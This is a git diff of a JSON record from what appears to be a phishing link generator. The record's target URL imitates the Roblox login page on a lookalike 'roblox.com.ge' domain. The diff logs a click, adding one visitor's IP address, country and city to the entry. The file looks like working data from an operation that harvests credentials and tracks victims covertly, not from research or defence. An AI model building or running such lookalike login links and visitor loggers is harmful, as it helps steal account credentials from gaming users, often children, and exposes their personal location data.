@@ -3612,8 +3612,17 @@
     "targetUrl": "https://www.roblox.com.ge/login",
     "createdAt": 1777054436576,
     "status": "active",
-    "useCount": 0,
+    "useCount": 1,
     "createdBy": "generator",
-    "clicks": []
+    "clicks": [
+      {
+        "timestamp": 1777054440502,
+        "ip": "222.127.186.127",
+        "country": "Philippines",
+        "city": "Lahug",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      }
+    ]
   }
 ]
